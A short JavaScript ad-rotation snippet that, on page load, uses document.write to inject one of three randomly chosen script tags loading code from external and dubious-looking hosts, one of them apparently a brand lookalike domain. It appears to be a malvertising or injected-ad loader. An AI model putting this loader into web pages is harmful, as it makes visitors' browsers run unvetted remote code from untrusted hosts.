var randoms = {
	ads_codes: ['<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'https://k.13hangpifa.com/d.php?pid=3860\'><'+'/script>','<script src="//js.maidagu.com/c.aspx?action=c&c1=7&c2=1206&c3=&c4=2&c5=AdCode_sjdb&c6=640x200&c7=1&c8=1&c9=&c10="><'+'/script>','<script src="https://show.suning.beer:12443/ty/FB5D70CC-CF11-1889-33-3C2B63ADFAE7.alpha"><'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();

